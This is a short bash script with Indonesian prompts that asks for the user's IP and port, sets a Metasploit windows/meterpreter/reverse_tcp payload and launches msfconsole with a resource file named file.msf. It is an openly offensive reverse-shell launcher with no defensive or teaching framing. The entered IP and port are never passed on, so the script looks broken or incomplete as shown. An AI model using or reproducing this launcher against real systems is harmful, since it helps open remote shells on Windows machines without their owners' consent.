#!/usr/bin/env bash


pwned='pw_exec.py'

echo " Masukkan IP anda :"
read ip;
echo " Masukkan PORT ANDA :"
read port;

payload=windows/meterpreter/reverse_tcp

msfconsole -r file.msf
